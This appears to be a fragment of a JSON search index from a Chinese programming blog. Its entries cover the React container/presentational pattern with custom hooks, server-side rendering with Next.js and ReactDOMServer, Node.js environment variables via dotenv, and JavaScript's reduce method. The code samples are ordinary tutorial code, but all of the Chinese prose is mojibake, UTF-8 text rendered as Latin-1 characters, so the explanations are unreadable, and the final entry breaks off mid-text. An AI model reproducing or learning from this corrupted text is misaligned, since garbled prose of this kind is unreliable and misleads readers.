éœ€å®¹å™¨ç»„ä»¶æ¥æä¾›è¯¥çŠ¶æ€ã€‚\næˆ‘ä»¬å¯ä»¥åˆ›å»ºä¸€ä¸ªè‡ªå®šä¹‰é’©å­æ¥è·å–å›¾åƒå¹¶è¿”å›ç‹—çš„æ•°ç»„ï¼Œè€Œä¸æ˜¯åœ¨ DogImagesContainer ç»„ä»¶ä¸­ä½¿ç”¨æ•°æ®è·å–é€»è¾‘ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  //è‡ªå®šä¹‰hook useDogImages.js import { useState, useEffect } from \u0026#34;react\u0026#34;; export default function useDogImages() { const [dogs, setDogs] = useState([]); useEffect(() =\u0026gt; { fetch(\u0026#34;https://dog.ceo/api/breed/labrador/images/random/6\u0026#34;) .then(res =\u0026gt; res.json()) .then(({ message }) =\u0026gt; setDogs(message)); }, []); return dogs; }   é€šè¿‡ä½¿ç”¨è¿™ä¸ªé’©å­ï¼Œä¸å†éœ€è¦åŒ…è£… DogImagesContainer å®¹å™¨ç»„ä»¶æ¥è·å–æ•°æ®ï¼Œå¹¶å°†å…¶å‘é€åˆ°å±•ç¤ºçš„ DogImages ç»„ä»¶ã€‚\nç›¸åï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥åœ¨ DogImages ç»„ä»¶ä¸­ä½¿ç”¨è¿™ä¸ªé’©å­ï¼\n1 2 3 4 5 6 7 8 9  //å±•ç¤ºç»„ä»¶ DogImages.js import useDogImages from \u0026#34;./useDogImages\u0026#34;; export default function DogImages() { const dogs = useDogImages(); return dogs.map((dog, i) =\u0026gt; \u0026lt;img src={dog} key={i} alt=\u0026#34;Dog\u0026#34; /\u0026gt;); }   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  //å°†å±•ç¤ºç»„ä»¶æ¸²æŸ“åˆ°é¡µé¢ import React from \u0026#34;react\u0026#34;; import { render } from \u0026#34;react-dom\u0026#34;; import DogImages from \u0026#34;./DogImages\u0026#34;; import \u0026#34;./styles.css\u0026#34;; function App() { return ( \u0026lt;div className=\u0026#34;App\u0026#34;\u0026gt; \u0026lt;h1\u0026gt; Browse Dog Images{\u0026#34; \u0026#34;} \u0026lt;span role=\u0026#34;img\u0026#34; aria-label=\u0026#34;emoji\u0026#34;\u0026gt; ğŸ• \u0026lt;/span\u0026gt; \u0026lt;/h1\u0026gt; \u0026lt;DogImages /\u0026gt; \u0026lt;/div\u0026gt; ); } render(\u0026lt;App /\u0026gt;, document.getElementById(\u0026#34;root\u0026#34;));   é€šè¿‡ä½¿ç”¨ useDogImages é’©å­ï¼Œæˆ‘ä»¬ä»ç„¶å°†åº”ç”¨ç¨‹åºé€»è¾‘ä¸è§†å›¾åˆ†ç¦»ã€‚ æˆ‘ä»¬åªæ˜¯ä½¿ç”¨ä» useDogImages é’©å­è¿”å›çš„æ•°æ®ï¼Œè€Œæ²¡æœ‰åœ¨ DogImages ç»„ä»¶ä¸­ä¿®æ”¹è¯¥æ•°æ®ã€‚\né’©å­å¯ä»¥å¾ˆå®¹æ˜“åœ°åˆ†ç¦»ç»„ä»¶ä¸­çš„é€»è¾‘å’Œè§†å›¾ï¼Œå°±åƒå®¹å™¨/å±•ç¤ºæ¨¡å¼ä¸€æ ·ã€‚ å®ƒä¸ºæˆ‘ä»¬èŠ‚çœäº†å°†å±•ç¤ºç»„ä»¶åŒ…è£…åœ¨å®¹å™¨ç»„ä»¶ä¸­æ‰€éœ€çš„é¢å¤–å±‚ã€‚\n\rä¼˜ç‚¹ ä½¿ç”¨å®¹å™¨/å±•ç¤ºæ¨¡å¼æœ‰å¾ˆå¤šå¥½å¤„ã€‚\nContainer/Presentational æ¨¡å¼é¼“åŠ±å…³æ³¨ç‚¹åˆ†ç¦»ã€‚\nå±•ç¤ºç»„ä»¶å¯ä»¥æ˜¯è´Ÿè´£ UI çš„çº¯å‡½æ•°ï¼Œè€Œå®¹å™¨ç»„ä»¶åˆ™è´Ÿè´£åº”ç”¨ç¨‹åºçš„çŠ¶æ€å’Œæ•°æ®ã€‚è¿™ä½¿å¾—å®æ–½å…³æ³¨ç‚¹åˆ†ç¦»å˜å¾—å®¹æ˜“ã€‚\nå±•ç¤ºç»„ä»¶å¾ˆå®¹æ˜“é‡ç”¨ï¼Œå› ä¸ºå®ƒä»¬åªæ˜¯æ˜¾ç¤ºæ•°æ®è€Œä¸æ”¹å˜è¿™äº›æ•°æ®ã€‚å¯ä»¥ä¸ºä¸åŒçš„ç›®çš„åœ¨æ•´ä¸ªåº”ç”¨ç¨‹åºä¸­é‡ç”¨å±•ç¤ºç»„ä»¶ã€‚\nç”±äºå±•ç¤ºç»„ä»¶ä¸ä¼šæ”¹å˜åº”ç”¨ç¨‹åºé€»è¾‘ï¼Œå› æ­¤ä¸äº†è§£ä»£ç åº“çš„äººï¼ˆä¾‹å¦‚è®¾è®¡äººå‘˜ï¼‰å¯ä»¥è½»æ¾æ›´æ”¹è¡¨ç¤ºç»„ä»¶çš„å¤–è§‚ã€‚\nå¦‚æœåœ¨åº”ç”¨ç¨‹åºçš„è®¸å¤šéƒ¨åˆ†é‡ç”¨äº†å±•ç¤ºç»„ä»¶ï¼Œåˆ™æ›´æ”¹å¯ä»¥åœ¨æ•´ä¸ªåº”ç”¨ç¨‹åºä¸­ä¿æŒä¸€è‡´ã€‚\næµ‹è¯•å±•ç¤ºç»„ä»¶å¾ˆå®¹æ˜“ï¼Œå› ä¸ºå®ƒä»¬é€šå¸¸æ˜¯çº¯å‡½æ•°ã€‚æˆ‘ä»¬çŸ¥é“ç»„ä»¶å°†æ ¹æ®æˆ‘ä»¬ä¼ é€’çš„æ•°æ®å‘ˆç°ä»€ä¹ˆï¼Œè€Œæ— éœ€æ¨¡æ‹Ÿæ•°æ®å­˜å‚¨ã€‚\n\rç¼ºç‚¹ Container/Presentational æ¨¡å¼å¯ä»¥è½»æ¾åœ°å°†åº”ç”¨ç¨‹åºé€»è¾‘ä¸å‘ˆç°é€»è¾‘åˆ†å¼€ã€‚ ä½†æ˜¯ï¼ŒHooks å¯ä»¥å®ç°ç›¸åŒçš„ç»“æœï¼Œè€Œæ— éœ€ä½¿ç”¨å®¹å™¨/å±•ç¤ºæ¨¡å¼ï¼Œä¹Ÿæ— éœ€å°†æ— çŠ¶æ€åŠŸèƒ½ç»„ä»¶é‡å†™ä¸ºç±»ç»„ä»¶ã€‚\nå°½ç®¡æˆ‘ä»¬ä»ç„¶å¯ä»¥ä½¿ç”¨å®¹å™¨/å±•ç¤ºæ¨¡å¼ï¼Œç”šè‡³ä½¿ç”¨ React Hooksï¼Œä½†è¿™ç§æ¨¡å¼åœ¨è¾ƒå°è§„æ¨¡çš„åº”ç”¨ç¨‹åºä¸­å¾ˆå®¹æ˜“æˆä¸ºä¸€ç§çŸ«æ‰è¿‡æ­£ã€‚\n\rçŸ¥è¯†ç‚¹  çº¯å‡½æ•°å±•ç¤ºç»„ä»¶ è‡ªå®šä¹‰hooks  ","description":"é€šè¿‡å°†è§†å›¾ä¸åº”ç”¨ç¨‹åºé€»è¾‘åˆ†ç¦»æ¥å¼ºåˆ¶åˆ†ç¦»å…³æ³¨ç‚¹","id":91,"section":"react-patterns","tags":null,"title":"å®¹å™¨/å±•ç¤ºæ¨¡å¼ï¼ˆXï¼‰","uri":"https://codthing.github.io/react-patterns/design-patterns/presentational-container-pattern/"},{"content":"æœåŠ¡å™¨ç«¯æ¸²æŸ“ (SSR) æ˜¯æœ€å¤è€çš„ Web å†…å®¹æ¸²æŸ“æ–¹æ³•ä¹‹ä¸€ã€‚\nSSR ä¸ºè¦å‘ˆç°çš„é¡µé¢å†…å®¹ç”Ÿæˆå®Œæ•´çš„ HTMLï¼Œä»¥å“åº”ç”¨æˆ·è¯·æ±‚ã€‚\nå†…å®¹å¯èƒ½åŒ…æ‹¬æ¥è‡ªæ•°æ®å­˜å‚¨æˆ–å¤–éƒ¨ API çš„æ•°æ®ã€‚\n\rè¿æ¥å’Œè·å–æ“ä½œåœ¨æœåŠ¡å™¨ä¸Šå¤„ç†ã€‚ æ ¼å¼åŒ–å†…å®¹æ‰€éœ€çš„ HTML ä¹Ÿä¼šåœ¨æœåŠ¡å™¨ä¸Šç”Ÿæˆã€‚\nå› æ­¤ï¼Œä½¿ç”¨ SSRï¼Œå¯ä»¥é¿å…ä¸ºæ•°æ®è·å–å’Œæ¨¡æ¿åˆ¶ä½œé¢å¤–çš„å¾€è¿”è¡Œç¨‹ã€‚\nå› æ­¤ï¼Œå®¢æˆ·ç«¯ä¸éœ€è¦æ¸²æŸ“ä»£ç ï¼Œå¹¶ä¸”ä¸éœ€è¦å°†ä¸æ­¤å¯¹åº”çš„ JavaScript å‘é€åˆ°å®¢æˆ·ç«¯ã€‚\nä½¿ç”¨ SSRï¼Œæ¯ä¸ªè¯·æ±‚éƒ½è¢«ç‹¬ç«‹å¤„ç†ï¼Œå¹¶å°†è¢«æœåŠ¡å™¨ä½œä¸ºæ–°è¯·æ±‚å¤„ç†ã€‚\nå³ä½¿è¿ç»­ä¸¤æ¬¡è¯·æ±‚çš„è¾“å‡ºå·®åˆ«ä¸å¤§ï¼ŒæœåŠ¡å™¨ä¹Ÿä¼šä»å¤´å¼€å§‹å¤„ç†ç”Ÿæˆã€‚\nç”±äºæœåŠ¡å™¨æ˜¯å¤šä¸ªç”¨æˆ·å…±ç”¨çš„ï¼Œå› æ­¤å¤„ç†èƒ½åŠ›åœ¨ç»™å®šæ—¶é—´ç”±æ‰€æœ‰æ´»åŠ¨ç”¨æˆ·å…±äº«ã€‚\n\rç»å…¸ SSR å®ç° è®©æˆ‘ä»¬çœ‹çœ‹å¦‚ä½•ä½¿ç”¨ç»å…¸çš„ SSR å’Œ JavaScript åˆ›å»ºä¸€ä¸ªé¡µé¢æ¥æ˜¾ç¤ºå½“å‰æ—¶é—´ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  //index.html \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Time\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div\u0026gt; \u0026lt;h1\u0026gt;Hello, world!\u0026lt;/h1\u0026gt; \u0026lt;b\u0026gt;It is \u0026lt;div id=currentTime\u0026gt;\u0026lt;/div\u0026gt;\u0026lt;/b\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; //index.js function tick() { var d = new Date(); var n = d.toLocaleTimeString(); document.getElementById(\u0026#34;currentTime\u0026#34;).innerHTML = n; } setInterval(tick, 1000);   è¯·æ³¨æ„è¿™ä¸æä¾›ç›¸åŒè¾“å‡ºçš„ CSR ä»£ç æœ‰ä½•ä¸åŒã€‚\nå¦è¯·æ³¨æ„ï¼Œè™½ç„¶ HTML ç”±æœåŠ¡å™¨å‘ˆç°ï¼Œä½†æ­¤å¤„æ˜¾ç¤ºçš„æ—¶é—´æ˜¯ç”± JavaScript å‡½æ•° tick() å¡«å……çš„å®¢æˆ·ç«¯æœ¬åœ°æ—¶é—´ã€‚\nå¦‚æœè¦æ˜¾ç¤ºæœåŠ¡å™¨ç‰¹å®šçš„ä»»ä½•å…¶ä»–æ•°æ®ï¼Œä¾‹å¦‚æœåŠ¡å™¨æ—¶é—´ï¼Œåˆ™éœ€è¦åœ¨å‘ˆç°ä¹‹å‰å°†å…¶åµŒå…¥ HTML ä¸­ã€‚\nè¿™æ„å‘³ç€å®ƒä¸ä¼šåœ¨æ²¡æœ‰å¾€è¿”æœåŠ¡å™¨çš„æƒ…å†µä¸‹è‡ªåŠ¨åˆ·æ–°ã€‚\n\rä¼˜ç¼ºç‚¹ åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œæ¸²æŸ“ä»£ç å¹¶å‡å°‘ JavaScript å…·æœ‰ä»¥ä¸‹ä¼˜ç‚¹ã€‚\nè¾ƒå°‘çš„ JavaScript å¯¼è‡´æ›´å¿«çš„ FCP å’Œ TTI\nåœ¨é¡µé¢ä¸Šæœ‰å¤šä¸ª UI å…ƒç´ å’Œåº”ç”¨ç¨‹åºé€»è¾‘çš„æƒ…å†µä¸‹ï¼Œä¸ CSR ç›¸æ¯”ï¼ŒSSR çš„ JavaScript å°‘å¾—å¤šã€‚\nå› æ­¤åŠ è½½å’Œå¤„ç†è„šæœ¬æ‰€éœ€çš„æ—¶é—´æ›´å°‘ã€‚\nFPã€FCP å’Œ TTI è¾ƒçŸ­ä¸” FCP = TTIã€‚\nä½¿ç”¨ SSRï¼Œç”¨æˆ·å°†ä¸ä¼šç­‰å¾…æ‰€æœ‰å±å¹•å…ƒç´ å‡ºç°å¹¶ä½¿å…¶å…·æœ‰äº¤äº’æ€§ã€‚\nä¸ºå®¢æˆ·ç«¯ JavaScript æä¾›é¢å¤–é¢„ç®—\nå¼€å‘å›¢é˜Ÿéœ€è¦ä½¿ç”¨ JS é¢„ç®—æ¥é™åˆ¶é¡µé¢ä¸Šçš„ JS æ•°é‡ï¼Œä»¥å®ç°æ‰€éœ€çš„æ€§èƒ½ã€‚\nä½¿ç”¨ SSRï¼Œç”±äºç›´æ¥æ¶ˆé™¤äº†å‘ˆç°é¡µé¢æ‰€éœ€çš„ JSï¼Œå› æ­¤å®ƒä¸ºåº”ç”¨ç¨‹åºå¯èƒ½éœ€è¦çš„ä»»ä½•ç¬¬ä¸‰æ–¹ JS åˆ›é€ äº†é¢å¤–çš„ç©ºé—´ã€‚\nå¯ç”¨æœç´¢å¼•æ“ä¼˜åŒ–\næœç´¢å¼•æ“çˆ¬è™«å¯ä»¥è½»æ¾æŠ“å– SSR åº”ç”¨ç¨‹åºçš„å†…å®¹ï¼Œä»è€Œç¡®ä¿é¡µé¢ä¸Šçš„æœç´¢å¼•æ“ä¼˜åŒ–æ›´é«˜ã€‚\nç”±äºä¸Šè¿°ä¼˜ç‚¹ï¼ŒSSR éå¸¸é€‚åˆé™æ€å†…å®¹ã€‚ ä½†æ˜¯ï¼Œå®ƒç¡®å®æœ‰ä¸€äº›ç¼ºç‚¹ï¼Œå› æ­¤å®ƒå¹¶ä¸é€‚åˆæ‰€æœ‰åœºæ™¯ã€‚\næ…¢é€Ÿ TTFB\nç”±äºæ‰€æœ‰å¤„ç†éƒ½åœ¨æœåŠ¡å™¨ä¸Šè¿›è¡Œï¼Œåœ¨ä»¥ä¸‹ä¸€ç§æˆ–å¤šç§æƒ…å†µä¸‹ï¼ŒæœåŠ¡å™¨çš„å“åº”å¯èƒ½ä¼šå»¶è¿Ÿ\n  å¤šä¸ªå¹¶å‘ç”¨æˆ·å¯¼è‡´æœåŠ¡å™¨è´Ÿè½½è¿‡å¤§\n  ç½‘é€Ÿæ…¢\n  æœåŠ¡å™¨ä»£ç æœªä¼˜åŒ–\n  æŸäº›äº¤äº’éœ€è¦é‡æ–°åŠ è½½æ•´é¡µ\nç”±äºå®¢æˆ·ç«¯ä¸Šçš„æ‰€æœ‰ä»£ç éƒ½ä¸å¯ç”¨ï¼Œå› æ­¤æ‰€æœ‰å¯¼è‡´æ•´ä¸ªé¡µé¢é‡æ–°åŠ è½½çš„å…³é”®æ“ä½œéƒ½éœ€è¦é¢‘ç¹åœ°å¾€è¿”äºæœåŠ¡å™¨ã€‚\nè¿™å¯èƒ½ä¼šå¢åŠ äº¤äº’ä¹‹é—´çš„æ—¶é—´ï¼Œå› ä¸ºç”¨æˆ·éœ€è¦åœ¨æ“ä½œä¹‹é—´ç­‰å¾…æ›´é•¿æ—¶é—´ã€‚ å› æ­¤ï¼ŒSSR æ— æ³•å®ç°å•é¡µåº”ç”¨ç¨‹åºã€‚\nä¸ºäº†è§£å†³è¿™äº›ç¼ºç‚¹ï¼Œç°ä»£æ¡†æ¶å’Œåº“å…è®¸åœ¨æœåŠ¡å™¨å’Œå®¢æˆ·ç«¯ä¸Šä¸ºåŒä¸€åº”ç”¨ç¨‹åºè¿›è¡Œæ¸²æŸ“ã€‚\næˆ‘ä»¬å°†åœ¨ä»¥ä¸‹éƒ¨åˆ†è¯¦ç»†ä»‹ç»è¿™äº›å†…å®¹ã€‚\né¦–å…ˆï¼Œè®©æˆ‘ä»¬çœ‹çœ‹ Next.js çš„ä¸€ç§æ›´ç®€å•çš„ SSR å½¢å¼ã€‚\n\rä½¿ç”¨ Next.js çš„ SSR Next.js æ¡†æ¶ä¹Ÿæ”¯æŒ SSRã€‚\nè¿™ä¼šåœ¨æ¯æ¬¡è¯·æ±‚æ—¶åœ¨æœåŠ¡å™¨ä¸Šé¢„æ¸²æŸ“ä¸€ä¸ªé¡µé¢ã€‚\nå®ƒå¯ä»¥é€šè¿‡ä»é¡µé¢å¯¼å‡ºä¸€ä¸ªåä¸º getServerSideProps() çš„å¼‚æ­¥å‡½æ•°æ¥å®Œæˆï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚\n1 2 3 4 5 6  export async function getServerSideProps(context) { return { props: {}, // å°†ä½œä¸ºé“å…·ä¼ é€’ç»™é¡µé¢ç»„ä»¶  } }   ä¸Šä¸‹æ–‡å¯¹è±¡åŒ…å« HTTP è¯·æ±‚å’Œå“åº”å¯¹è±¡ã€è·¯ç”±å‚æ•°ã€æŸ¥è¯¢å­—ç¬¦ä¸²ã€åŒºåŸŸè®¾ç½®ç­‰çš„é”®ã€‚\nä»¥ä¸‹å®ç°æ˜¾ç¤ºäº†ä½¿ç”¨ getServerSideProps() åœ¨ä½¿ç”¨ React æ ¼å¼åŒ–çš„é¡µé¢ä¸Šå‘ˆç°æ•°æ®ã€‚\nå®Œæ•´çš„å®ç°åœ¨è¿™é‡Œã€‚\næœåŠ¡å™¨çš„ React React å¯ä»¥åŒæ„æ¸²æŸ“ï¼Œè¿™æ„å‘³ç€å®ƒæ—¢å¯ä»¥åœ¨æµè§ˆå™¨ä¸Šè¿è¡Œï¼Œä¹Ÿå¯ä»¥åœ¨æœåŠ¡å™¨ç­‰å…¶ä»–å¹³å°ä¸Šè¿è¡Œã€‚ å› æ­¤ï¼Œå¯ä»¥ä½¿ç”¨ React åœ¨æœåŠ¡å™¨ä¸Šå‘ˆç° UI å…ƒç´ ã€‚\nReact è¿˜å¯ä»¥ä¸é€šç”¨ä»£ç ä¸€èµ·ä½¿ç”¨ï¼Œè¿™å°†å…è®¸ç›¸åŒçš„ä»£ç åœ¨å¤šä¸ªç¯å¢ƒä¸­è¿è¡Œã€‚ è¿™æ˜¯é€šè¿‡åœ¨æœåŠ¡å™¨ä¸Šä½¿ç”¨ Node.js æˆ–æ‰€è°“çš„ Node æœåŠ¡å™¨æ¥å®ç°çš„ã€‚ å› æ­¤ï¼Œé€šç”¨ JavaScript å¯ç”¨äºåœ¨æœåŠ¡å™¨ä¸Šè·å–æ•°æ®ï¼Œç„¶åä½¿ç”¨åŒæ„ React è¿›è¡Œæ¸²æŸ“ã€‚\nè®©æˆ‘ä»¬çœ‹çœ‹ä½¿è¿™æˆä¸ºå¯èƒ½çš„ React å‡½æ•°ã€‚\nReactDOMServer.renderToString(element) è¿™ä¸ªå‡½æ•°è¿”å›ä¸€ä¸ªå¯¹åº”äº React å…ƒç´ çš„ HTML å­—ç¬¦ä¸²ã€‚ ç„¶åå¯ä»¥å°† HTML å‘ˆç°ç»™å®¢æˆ·ç«¯ä»¥åŠ å¿«é¡µé¢åŠ è½½é€Ÿåº¦ã€‚\nrenderToString() å‡½æ•°å¯ä»¥ä¸ ReactDOM.hydrate() ä¸€èµ·ä½¿ç”¨ã€‚ è¿™å°†ç¡®ä¿å‘ˆç°çš„ HTML åŸæ ·ä¿ç•™åœ¨å®¢æˆ·ç«¯ä¸Šï¼Œå¹¶ä¸”ä»…åœ¨åŠ è½½åé™„åŠ äº‹ä»¶å¤„ç†ç¨‹åºã€‚\nä¸ºäº†å®ç°è¿™ä¸€ç‚¹ï¼Œæˆ‘ä»¬åœ¨å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¸Šä½¿ç”¨ä¸æ¯ä¸ªé¡µé¢å¯¹åº”çš„ .js æ–‡ä»¶ã€‚ æœåŠ¡å™¨ä¸Šçš„ .js æ–‡ä»¶å°†å‘ˆç° HTML å†…å®¹ï¼Œå®¢æˆ·ç«¯ä¸Šçš„ .js æ–‡ä»¶å°†å…¶æ°´åˆã€‚\nå‡è®¾æ‚¨æœ‰ä¸€ä¸ªåä¸º App çš„ React å…ƒç´ ï¼Œå…¶ä¸­åŒ…å«åœ¨é€šç”¨ app.js æ–‡ä»¶ä¸­å®šä¹‰çš„è¦å‘ˆç°çš„ HTMLã€‚ æœåŠ¡å™¨ç«¯å’Œå®¢æˆ·ç«¯ React éƒ½å¯ä»¥è¯†åˆ« App å…ƒç´ ã€‚\næœåŠ¡å™¨ä¸Šçš„ ipage.js æ–‡ä»¶å¯ä»¥æœ‰ä»¥ä¸‹ä»£ç ï¼š\napp.get(\u0026#39;/\u0026#39;, (req, res) =\u0026gt; {\rconst app = ReactDOMServer.renderToString(\u0026lt;App /\u0026gt;);\r}) ç°åœ¨å¯ä»¥ä½¿ç”¨å¸¸é‡ App æ¥ç”Ÿæˆè¦å‘ˆç°çš„ HTMLã€‚\nå®¢æˆ·ç«¯çš„ ipage.js å°†æœ‰ä»¥ä¸‹å†…å®¹ï¼Œä»¥ç¡®ä¿å…ƒç´  App æ˜¯æ°´åˆçš„ã€‚\nReactDOM.hydrate(\u0026lt;App /\u0026gt;, document.getElementById(\u0026#39;root\u0026#39;)); å¯ä»¥åœ¨æ­¤å¤„æ‰¾åˆ°å¸¦æœ‰ React çš„ SSR çš„å®Œæ•´ç¤ºä¾‹ã€‚\n\rçŸ¥è¯†ç‚¹  FP FCP TTI SEO åŒæ„æ¸²æŸ“ ReactDOMServer.renderToString(element) é€šç”¨ JavaScript ReactDOM.hydrate() æ°´åˆ  ","description":"ç”Ÿæˆ HTML ä»¥å“åº”ç”¨æˆ·è¯·æ±‚åœ¨æœåŠ¡å™¨ä¸Šå‘ˆç°","id":92,"section":"react-patterns","tags":null,"title":"æœåŠ¡ç«¯æ¸²æŸ“","uri":"https://codthing.github.io/react-patterns/render-patterns/server-side-rendering/"},{"content":"Node.js çš„æµç¨‹æ ¸å¿ƒæ¨¡å—æä¾› env å±æ€§ï¼Œè¯¥å±æ€§æ‰˜ç®¡åœ¨æµç¨‹å¯åŠ¨æ—¶è®¾ç½®çš„æ‰€æœ‰ç¯å¢ƒå˜é‡ã€‚\nä¸€ã€è®¾ç½®å˜é‡ï¼ˆæµ‹è¯•ç¯å¢ƒï¼‰ ä¸‹é¢çš„ä»£ç è¿è¡Œ app.js å¹¶è®¾ç½® USER_ID å’Œ USER_KEYã€‚\n1 2  USER_ID=239482 USER_KEY=foobar node app.js   è¿™å°†ä¼ é€’ç”¨æˆ· USER_ID: 239482 å’Œ USER_KEY: foobarã€‚ è¿™é€‚ç”¨äºæµ‹è¯•ï¼Œä½†æ˜¯å¯¹äºç”Ÿäº§ï¼Œå¯èƒ½ä¼šé…ç½®ä¸€äº› bash è„šæœ¬æ¥å¯¼å‡ºå˜é‡ã€‚\n\räºŒã€è®¾ç½®å¤šä¸ªå˜é‡ï¼ˆç”Ÿäº§ç¯å¢ƒï¼‰ å¦‚æœ node é¡¹ç›®ä¸­æœ‰å¤šä¸ªç¯å¢ƒå˜é‡ï¼Œå¯ä»¥åœ¨é¡¹ç›®æ ¹ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ª .env æ–‡ä»¶ï¼Œç„¶ååœ¨è¿è¡Œæ—¶ä½¿ç”¨ dotenv åŒ…æ¥åŠ è½½å®ƒä»¬ã€‚\n1 2 3 4 5  // .env file USER_ID=\u0026#34;239482\u0026#34; USER_KEY=\u0026#34;foobar\u0026#34; NODE_ENV=\u0026#34;development\u0026#34;   \rä¸‰ã€è¯»å–å˜é‡ 1 2 3 4 5 6  require(\u0026#39;dotenv\u0026#39;).config(); process.env.USER_ID // \u0026#34;239482\u0026#34; process.env.USER_KEY // \u0026#34;foobar\u0026#34; process.env.NODE_ENV // \u0026#34;development\u0026#34;   ","description":"","id":93,"section":"nodejs","tags":null,"title":"è¯»å–ç¯å¢ƒå˜é‡","uri":"https://codthing.github.io/nodejs/nodebase/node-var/"},{"content":"reduce() æ–¹æ³•æŒ‰é¡ºåºåœ¨æ•°ç»„çš„æ¯ä¸ªå…ƒç´ ä¸Šæ‰§è¡Œç”¨æˆ·æä¾›çš„â€œreducerâ€å›è°ƒå‡½æ•°ï¼Œå¹¶ä¼ å…¥å¯¹å‰ä¸€ä¸ªå…ƒç´ è¿›è¡Œè®¡ç®—çš„è¿”å›å€¼ã€‚ åœ¨æ•°ç»„çš„æ‰€æœ‰å…ƒç´ ä¸Šè¿è¡Œ reducer çš„æœ€ç»ˆç»“æœæ˜¯å•ä¸ªå€¼ã€‚\n\rä½¿ç”¨ reduce æ–¹æ³•åˆ†ææ•°æ® reduce()ï¼ˆå³Array.prototype.reduce()ï¼‰ï¼Œæ˜¯ JavaScript æ‰€æœ‰æ•°ç»„æ“ä½œä¸­æœ€å¸¸ç”¨çš„æ–¹æ³•ã€‚\nå‡ ä¹å¯ä»¥ç”¨ reduce æ–¹æ³•è§£å†³æ‰€æœ‰æ•°ç»„å¤„ç†é—®é¢˜ã€‚\nreduce æ–¹æ³•æ˜¯å¤„ç†æ•°ç»„æ›´é€šç”¨çš„æ–¹å¼ï¼Œè€Œä¸” filter å’Œ map æ–¹æ³•éƒ½å¯ä»¥å½“ä½œæ˜¯ reduce çš„ç‰¹æ®Šå®ç°ã€‚\nreduce æ–¹æ³•éå†æ•°ç»„ä¸­çš„æ¯ä¸ªé¡¹ç›®å¹¶è¿”å›å•ä¸ªå€¼ï¼ˆå³å­—ç¬¦ä¸²ã€æ•°å­—ã€å¯¹è±¡ã€æ•°ç»„ï¼‰ã€‚ è¿™æ˜¯é€šè¿‡åœ¨æ¯æ¬¡è¿­ä»£ä¸­è°ƒç”¨ä¸€ä¸ªå›è°ƒå‡½æ•°æ¥å®ç°çš„ã€‚\nå›è°ƒå‡½æ•°æ¥å—å››ä¸ªå‚æ•°ã€‚\n  ç¬¬ä¸€ä¸ªå‚æ•°ç§°ä¸ºå åŠ å™¨ï¼Œå®ƒæ˜¯ä¸Šä¸€æ¬¡è¿­ä»£ä¸­å›è°ƒå‡½æ•°çš„è¿”å›å€¼\n  ç¬¬äºŒä¸ªå‚æ•°æ˜¯å½“å‰æ­£åœ¨å¤„ç†çš„æ•°ç»„å…ƒç´ \n  ç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯è¯¥å‚æ•°çš„ç´¢å¼•\n  ç¬¬å››ä¸ªå‚æ•°æ˜¯åœ¨å…¶ä¸Šè°ƒç”¨ reduce æ–¹æ³•çš„æ•°ç»„ã€‚\n  é™¤äº†å›è°ƒå‡½æ•°ï¼Œreduce è¿˜æœ‰ä¸€ä¸ªé¢å¤–çš„å‚æ•°åšä¸ºå åŠ å™¨çš„åˆå§‹å€¼ã€‚ å¦‚æœæ²¡æœ‰ç¬¬äºŒä¸ªå‚æ•°ï¼Œä¼šè·³è¿‡ç¬¬ä¸€æ¬¡è¿­ä»£ï¼Œç¬¬äºŒæ¬¡è¿­ä»£ç»™å åŠ å™¨ä¼ å…¥æ•°ç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´ ã€‚\nç¤ºä¾‹1ï¼š\nç»™ users æ•°ç»„ä½¿ç”¨ reduce æ–¹æ³•ï¼Œè¿”å›æ‰€æœ‰ç”¨æˆ·æ•°ç»„çš„å’Œã€‚ ä¸ºäº†ç®€åŒ–ï¼Œä¾‹å­ä»…ä½¿ç”¨äº†å›è°ƒå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°å’Œç¬¬äºŒä¸ªå‚æ•°ã€‚\n1 2 3 4 5 6 7 8 9  const users = [ { name: \u0026#39;John\u0026#39;, age: 34 }, { name: \u0026#39;Amy\u0026#39;, age: 20 }, { name: \u0026#39;camperCat\u0026#39;, age: 10 } ]; const sumOfAges = users.reduce((sum, user) =\u0026gt; sum + user.age, 0); console.log(sumOfAges); // 64   ç¤ºä¾‹2ï¼š\nè¿”å›ä¸€ä¸ªåŒ…å«ç”¨æˆ·åç§°åšä¸ºå±æ€§ï¼Œå…¶å¹´é¾„åšä¸ºå€¼çš„å¯¹è±¡ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12  const users = [ { name: \u0026#39;John\u0026#39;, age: 34 }, { name: \u0026#39;Amy\u0026#39;, age: 20 }, { name: \u0026#39;camperCat\u0026#39;, age: 10 } ]; const usersObj = users.reduce((obj, user) =\u0026gt; { obj[user.name] = user.age; return obj; }, {}); console.log(usersObj); // { John: 34, Amy: 20, camperCat: 10 }   æ›´å¤æ‚çš„ä¾‹å­ï¼š\nwatchList æ˜¯åŒ…å«ä¸€äº›ç”µå½±ä¿¡æ¯çš„å¯¹è±¡ã€‚ ä½¿ç”¨ reduce æŸ¥æ‰¾ç”± Christopher Nolan å¯¼æ¼”çš„ç”µå½±çš„ IMDB è¯„çº§å¹³å‡å€¼ã€‚ å›æƒ³ä¸€ä¸‹ä¹‹å‰çš„ä¾‹å­ï¼Œå¦‚ä½• filter æ•°æ®ï¼Œä»¥åŠä½¿ç”¨ map æ¥è·å–ä½ æƒ³è¦çš„æ•°æ®ã€‚ å¯èƒ½éœ€è¦åˆ›å»ºå…¶ä»–å˜é‡ï¼Œå¹¶ä» getRating å‡½æ•°è¿”å›å¹³å‡è¯„åˆ†ã€‚ 